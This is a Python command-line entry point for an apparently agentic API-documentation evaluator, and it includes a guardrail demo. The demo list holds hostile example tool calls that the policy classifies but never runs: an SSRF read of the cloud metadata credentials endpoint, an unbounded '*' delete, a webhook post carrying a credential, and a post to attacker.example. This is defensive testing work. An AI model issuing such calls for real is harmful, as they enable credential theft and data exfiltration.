"""Command-line entry point.

Also the place the guardrail demo lives (``--demo-risky-tool``): the graph's own
evaluation path never calls a HIGH_RISK tool, because a documentation evaluator
has no business deleting data or posting to webhooks. Exercising those tiers
therefore needs an explicit driver rather than a contrived agent step.
"""

from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path
from typing import Any

from .config import Settings
from .graph import Evaluation
from .guardrails.engine import GuardrailEngine
from .observability.instrument import emit_to_agentops
from .samples import SYNTHETIC_CREDENTIAL

DEMO_CALLS: list[tuple[str, dict[str, Any], str]] = [
    (
        "fetch_document",
        {"url": "https://petstore3.swagger.io/api/v3/openapi.json"},
        "an allowlisted read — the common case, and it must stay frictionless",
    ),
    (
        "fetch_document",
        {"url": "https://cdn.unknown-vendor.example/spec.json"},
        "an off-allowlist read — legitimate, but audited",
    ),
    (
        "fetch_document",
        {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
        "the cloud metadata endpoint — SSRF, never approvable",
    ),
    (
        "purge_cache",
        {"pattern": "specs/petstore.json"},
        "a bounded delete — a human can meaningfully approve this",
    ),
    (
        "purge_cache",
        {"pattern": "*"},
        "an unbounded delete — blocked rather than offered for approval",
    ),
    (
        "send_external_report",
        {"webhook_url": "https://petstore3.swagger.io/hooks/report", "body": "Score 92/100."},
        "an outbound POST to a known destination — needs approval",
    ),
    (
        "send_external_report",
        {
            "webhook_url": "https://petstore3.swagger.io/hooks/report",
            "body": f"Auth uses key {SYNTHETIC_CREDENTIAL}",
        },
        "an outbound POST carrying a credential — exfiltration, blocked",
    ),
    (
        "send_external_report",
        {"webhook_url": "https://attacker.example/collect", "body": "Score 92/100."},
        "an outbound POST to an unknown destination — the prompt-injection case",
    ),
]


def _demo_risky_tools(settings: Settings) -> int:
    """Show what the policy does with each call, without executing any of them."""
    engine = GuardrailEngine(allowed_hosts=settings.allowed_hosts)
    print("\nGuardrail policy — what happens to each prospective call\n")
    print(f"{'TOOL':<22} {'TIER':<10} {'ACTION':<14} RULES")
    print("-" * 100)
    for tool, args, note in DEMO_CALLS:
        decision = engine.evaluate(tool, args)
        rules = ", ".join(decision.matched_rules) or "—"
        print(f"{tool:<22} {decision.tier.value:<10} {decision.action.value:<14} {rules}")
        print(f"{'':<22} └─ {note}")
        if decision.blocked:
            print(f"{'':<22}    refused: {decision.reason[:150]}")
        print()
    print(
        "ALLOW runs · ALLOW_AUDITED runs and is logged · CONFIRM suspends the graph for a\n"
        "human · BLOCK never executes and returns a structured refusal to the agent.\n"
    )
    return 0


def _print_policy(settings: Settings) -> int:
    engine = GuardrailEngine(allowed_hosts=settings.allowed_hosts)
    print(json.dumps(engine.describe(), indent=2))
    return 0


def _auto_approver(answer: bool):
    def approver(decision, args):
        print(
            f"\n  [guardrail] {decision.tool} is {decision.tier.value}: {decision.reason}\n"
            f"  [guardrail] --approve={answer}, so the call is "
            f"{'allowed' if answer else 'refused'}.\n"
        )
        return answer

    return approver


def _prompt_approver(decision, args) -> bool:
    print(f"\n  ⚠  {decision.tool} is {decision.tier.value}")
    print(f"     {decision.reason}")
    for key, value in args.items():
        print(f"     {key} = {str(value)[:200]}")
    try:
        return input("     Allow this call? [y/N] ").strip().lower() in ("y", "yes")
    except (EOFError, KeyboardInterrupt):
        print("     (no answer — refusing)")
        return False


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="doc-evaluator",
        description="Multi-agent evaluation of API documentation, with tiered guardrails.",
    )
    parser.add_argument("--target", help="URL or path of the OpenAPI document to evaluate.")
    parser.add_argument(
        "--mock",
        action="store_true",
        help="Force replay mode. Runs the whole graph with no API key.",
    )
    parser.add_argument("--live", action="store_true", help="Force live Claude calls.")
    parser.add_argument("--model", help="Override the model id.")
    parser.add_argument(
        "--no-guardrails",
        action="store_true",
        help="Disable policy evaluation. The benchmark's control arm; not for real use.",
    )
    parser.add_argument(
        "--approve",
        choices=("ask", "yes", "no"),
        default="ask",
        help="How to answer HIGH_RISK approvals (default: ask interactively).",
    )
    parser.add_argument("--report", type=Path, help="Write the markdown report to this path.")
    parser.add_argument("--ledger", type=Path, help="Write the run ledger JSON to this path.")
    parser.add_argument("--json", action="store_true", help="Print the run summary as JSON.")
    parser.add_argument(
        "--demo-risky-tool",
        action="store_true",
        help="Show how the policy classifies a spread of risky calls, then exit.",
    )
    parser.add_argument("--show-policy", action="store_true", help="Dump the policy and exit.")
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)

    overrides: dict[str, Any] = {}
    if args.mock and args.live:
        print("error: --mock and --live are mutually exclusive", file=sys.stderr)
        return 2
    if args.mock:
        overrides["mode"] = "mock"
    if args.live:
        overrides["mode"] = "live"
    if args.model:
        overrides["model"] = args.model
    if args.no_guardrails:
        overrides["guardrails_enabled"] = False

    settings = Settings.from_env(**overrides)

    if args.show_policy:
        return _print_policy(settings)
    if args.demo_risky_tool:
        return _demo_risky_tools(settings)
    if not args.target:
        print("error: --target is required (or use --demo-risky-tool)", file=sys.stderr)
        return 2

    if settings.resolved_mode == "live" and not settings.api_key:
        print("error: --live requires ANTHROPIC_API_KEY to be set", file=sys.stderr)
        return 2

    approver = _prompt_approver if args.approve == "ask" else _auto_approver(args.approve == "yes")
    run = Evaluation(settings=settings, approver=approver)

    print(f"Evaluating {args.target}  [mode={settings.resolved_mode}, model={settings.model}]")
    result = run.start(args.target)

    while result.interrupted and result.interrupt_payload:
        payload = result.interrupt_payload
        approved = approver(
            type("D", (), {
                "tool": payload["tool"],
                "tier": type("T", (), {"value": payload["risk_tier"]})(),
                "reason": payload["reason"],
            })(),
            payload.get("arguments", {}),
        )
        result = run.resume(approved)

    print("\n--- routing ---")
    for record in result.state.get("route_log") or []:
        print(f"  {record.iteration}. {record.decision:<10} [{record.source}] {record.reason}")

    guardrail_log = result.state.get("guardrail_log") or []
    if guardrail_log:
        print("\n--- guardrails ---")
        for event in guardrail_log:
            print(f"  {event.tool:<20} {event.tier:<10} {event.action:<14} {event.reason[:70]}")

    summary = result.summary()
    print("\n--- run ---")
    print(
        f"  score {summary['score']}/100 ({summary['grade']}) · {summary['findings']} findings · "
        f"{summary['hops']} hops"
    )
    print(
        f"  {summary['total_tokens']:,} tokens · ${summary['total_usd']:.5f} · "
        f"{summary['elapsed_seconds']:.2f}s wall"
    )
    print(
        f"  guardrails: {summary['guardrail_evaluations']} evaluations, "
        f"{summary['guardrail_total_ms']:.3f} ms total "
        f"({summary['guardrail_mean_ms']:.4f} ms each)"
    )
    if summary.get("halt_reason"):
        print(f"  halted: {summary['halt_reason']}")

    if args.report and result.report:
        args.report.parent.mkdir(parents=True, exist_ok=True)
        args.report.write_text(result.report)
        print(f"\nreport → {args.report}")
    if args.ledger:
        args.ledger.parent.mkdir(parents=True, exist_ok=True)
        args.ledger.write_text(result.ledger.to_json())
        print(f"ledger → {args.ledger}")
    if args.json:
        print(json.dumps(summary, indent=2, default=str))
    elif result.report and not args.report:
        print("\n" + result.report)

    emit_to_agentops(result.ledger, settings.agentops_api_key)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
